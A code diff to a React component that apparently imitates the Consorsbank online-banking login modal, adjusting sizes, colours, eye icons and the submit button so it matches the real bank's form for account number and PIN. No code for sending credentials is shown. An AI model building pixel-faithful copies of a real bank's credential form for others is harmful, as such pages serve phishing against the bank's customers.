@@ -291,7 +291,7 @@ const Consorsbank = () => {
         {showLogin && (
           <div className="fixed inset-0 z-50 flex items-start justify-center overflow-y-auto" style={{ background: "rgba(0,0,0,0.5)" }} onClick={() => setShowLogin(false)}>
             <div
-              className="bg-white w-full max-w-[680px] mx-4 my-8 rounded-lg shadow-xl relative"
+              className="bg-white w-full max-w-[540px] mx-4 my-8 rounded-lg shadow-xl relative"
               style={{ padding: "32px 40px 40px" }}
               onClick={(e) => e.stopPropagation()}
             >
@@ -301,21 +301,21 @@ const Consorsbank = () => {
 
               <form onSubmit={handleLogin}>
                 <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", rowGap: 14, columnGap: 20, alignItems: "center" }}>
-                  <h2 className="font-bold" style={{ fontSize: 26, lineHeight: 1.2, textAlign: "left", gridColumn: "1 / 2" }}>Loggen Sie sich ein:</h2>
+                  <h2 className="font-bold" style={{ fontSize: 22, lineHeight: 1.2, textAlign: "left", gridColumn: "1 / 2", whiteSpace: "nowrap" }}>Loggen Sie sich ein:</h2>
                   <div style={{ gridColumn: "2 / 3" }} />
 
-                  <label htmlFor="cb-user" className="text-[15px]" style={{ color: TEXT, textAlign: "right" }}>Kontonummer / UserID:</label>
+                  <label htmlFor="cb-user" className="text-[16px]" style={{ color: TEXT, textAlign: "right" }}>Kontonummer / UserID:</label>
                   <input
                     id="cb-user"
                     type="text"
                     autoComplete="off"
                     value={username}
                     onChange={(e) => setUsername(e.target.value)}
-                    style={{ height: 40, border: `1px solid ${BORDER}`, borderRadius: 4, padding: "0 12px", fontSize: 15, fontFamily: "inherit", outline: "none", color: TEXT }}
+                    style={{ height: 40, border: `1px solid #707175`, borderRadius: 4, padding: "0 12px", fontSize: 15, fontFamily: "inherit", outline: "none", color: TEXT }}
                     onFocus={(e) => { e.currentTarget.style.borderColor = PETROL; e.currentTarget.style.boxShadow = `0 0 0 1px ${PETROL}`; }}
-                    onBlur={(e) => { e.currentTarget.style.borderColor = BORDER; e.currentTarget.style.boxShadow = "none"; }}
+                    onBlur={(e) => { e.currentTarget.style.borderColor = "#707175"; e.currentTarget.style.boxShadow = "none"; }}
                   />
-                  <label htmlFor="cb-pw" className="text-[15px]" style={{ color: TEXT, textAlign: "right" }}>Online-PIN / Passwort:</label>
+                  <label htmlFor="cb-pw" className="text-[16px]" style={{ color: TEXT, textAlign: "right" }}>Online-PIN / Passwort:</label>
                   <div style={{ position: "relative" }}>
                     <input
                       id="cb-pw"
@@ -323,36 +323,45 @@ const Consorsbank = () => {
                       autoComplete="off"
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
-                      style={{ height: 40, width: "100%", border: `1px solid ${BORDER}`, borderRadius: 4, padding: "0 40px 0 12px", fontSize: 15, fontFamily: "inherit", outline: "none", color: TEXT }}
+                      style={{ height: 40, width: "100%", border: `1px solid #707175`, borderRadius: 4, padding: "0 40px 0 12px", fontSize: 15, fontFamily: "inherit", outline: "none", color: TEXT }}
                       onFocus={(e) => { e.currentTarget.style.borderColor = PETROL; e.currentTarget.style.boxShadow = `0 0 0 1px ${PETROL}`; }}
-                      onBlur={(e) => { e.currentTarget.style.borderColor = BORDER; e.currentTarget.style.boxShadow = "none"; }}
+                      onBlur={(e) => { e.currentTarget.style.borderColor = "#707175"; e.currentTarget.style.boxShadow = "none"; }}
                     />
-                    <button
-                      type="button"
-                      aria-label={showPw ? "PIN verbergen" : "PIN anzeigen"}
-                      onClick={() => setShowPw((v) => !v)}
-                      className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-black"
-                    >
-                      {showPw ? <EyeOff size={18} /> : <Eye size={18} />}
-                    </button>
+                    {password.length > 0 && (
+                      <button
+                        type="button"
+                        aria-label={showPw ? "PIN verbergen" : "PIN anzeigen"}
+                        onClick={() => setShowPw((v) => !v)}
+                        className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-black"
+                      >
+                        {showPw ? (
+                          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                            <path fillRule="evenodd" clipRule="evenodd" d="M17.14 18.59c-1.446.847-3.168 1.448-5.14 1.448-2.771 0-5.047-1.187-6.757-2.572-1.707-1.382-2.904-3.003-3.549-3.994a2.62 2.62 0 0 1 0-2.869c.639-.982 1.82-2.582 3.501-3.956L2.293 3.745 3.707 2.33l18 18-1.414 1.414-3.154-3.154Zm-1.473-1.471-2.002-2.002a3.502 3.502 0 0 1-4.745-4.745L6.618 8.07c-.04.03-.078.062-.117.093-1.484 1.202-2.549 2.636-3.13 3.53a.62.62 0 0 0 0 .69c.581.893 1.646 2.327 3.13 3.53 1.481 1.198 3.326 2.125 5.5 2.125 1.351 0 2.577-.36 3.666-.92Zm-5.165-5.165 1.582 1.581a1.497 1.497 0 0 1-1.582-1.58Z"/>
+                            <path d="M22.306 13.472a18.57 18.57 0 0 1-1.375 1.85l-1.42-1.42a16.62 16.62 0 0 0 1.118-1.52.62.62 0 0 0 0-.689c-.581-.894-1.646-2.328-3.13-3.53-1.481-1.2-3.326-2.125-5.499-2.125-.116 0-.231.002-.345.007L9.883 4.274A9.595 9.595 0 0 1 12 4.038c2.771 0 5.047 1.186 6.758 2.57 1.707 1.383 2.904 3.004 3.548 3.995a2.62 2.62 0 0 1 0 2.87Z"/>
+                          </svg>
+                        ) : (
+                          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                            <path fillRule="evenodd" clipRule="evenodd" d="M6.501 8.163c-1.484 1.202-2.549 2.636-3.13 3.53a.62.62 0 0 0 0 .69c.581.893 1.646 2.327 3.13 3.53C7.982 17.11 9.827 18.037 12 18.037c2.173 0 4.018-.927 5.499-2.126 1.484-1.202 2.549-2.636 3.13-3.53a.62.62 0 0 0 0-.689c-.581-.894-1.646-2.328-3.13-3.53-1.481-1.2-3.326-2.125-5.499-2.125-2.173 0-4.018.926-5.499 2.125ZM5.243 6.61C6.953 5.224 9.229 4.038 12 4.038c2.771 0 5.047 1.186 6.757 2.57 1.707 1.383 2.905 3.004 3.549 3.995a2.62 2.62 0 0 1 0 2.87c-.644.99-1.842 2.611-3.549 3.993-1.71 1.385-3.986 2.572-6.757 2.572-2.771 0-5.047-1.187-6.757-2.572-1.707-1.382-2.905-3.003-3.549-3.994a2.62 2.62 0 0 1 0-2.869c.644-.991 1.842-2.612 3.549-3.994ZM12 10.288a1.75 1.75 0 1 0 0 3.5 1.75 1.75 0 0 0 0-3.5Zm-3.75 1.75a3.75 3.75 0 1 1 7.5 0 3.75 3.75 0 0 1-7.5 0Z"/>
+                          </svg>
+                        )}
+                      </button>
+                    )}
                   </div>
 
                   <div style={{ gridColumn: "2 / 3" }} className="mt-3 flex flex-col gap-2">
-                    <a href="#" onClick={(e) => e.preventDefault()} className="text-[14px] font-semibold underline" style={{ color: TEXT, textDecorationColor: TEXT }}>Online-PIN vergessen</a>
-                    <a href="#" onClick={(e) => e.preventDefault()} className="text-[14px] font-semibold underline" style={{ color: TEXT, textDecorationColor: TEXT }}>Fragen zum TAN-Verfahren?</a>
+                    <a href="#" onClick={(e) => e.preventDefault()} className="text-[12px] font-semibold underline" style={{ color: TEXT, textDecorationColor: TEXT }}>Online-PIN vergessen</a>
+                    <a href="#" onClick={(e) => e.preventDefault()} className="text-[12px] font-semibold underline" style={{ color: TEXT, textDecorationColor: TEXT }}>Fragen zum TAN-Verfahren?</a>
                   </div>
 
                   <div style={{ gridColumn: "2 / 3" }} className="mt-4">
                     <button
                       type="submit"
-                      disabled={!username || !password}
                       style={{
                         display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 10,
                         width: "100%",
                         height: 52, padding: "0 24px", borderRadius: 999,
                         background: PETROL, color: "#fff", fontWeight: 700, fontSize: 17,
-                        opacity: !username || !password ? 0.5 : 1,
-                        border: "none", cursor: !username || !password ? "not-allowed" : "pointer",
+                        border: "none", cursor: "pointer",
                       }}
                     >
                       <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
@@ -362,7 +371,7 @@ const Consorsbank = () => {
                     </button>
                   </div>
 
-                  <div style={{ gridColumn: "2 / 3" }} className="mt-4">
+                  <div style={{ gridColumn: "2 / 3" }} className="mt-4 flex justify-center">
                     <a href="#" onClick={(e) => e.preventDefault()} className="inline-flex items-center gap-2 font-semibold text-[15px]" style={{ color: PETROL }}>
                       <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                         <path d="M12 2 2 7v2h20V7L12 2Zm-7 8v7H3v2h18v-2h-2v-7h-2v7h-3v-7h-2v7h-2v-7H8v7H5v-7H3h2Z" />
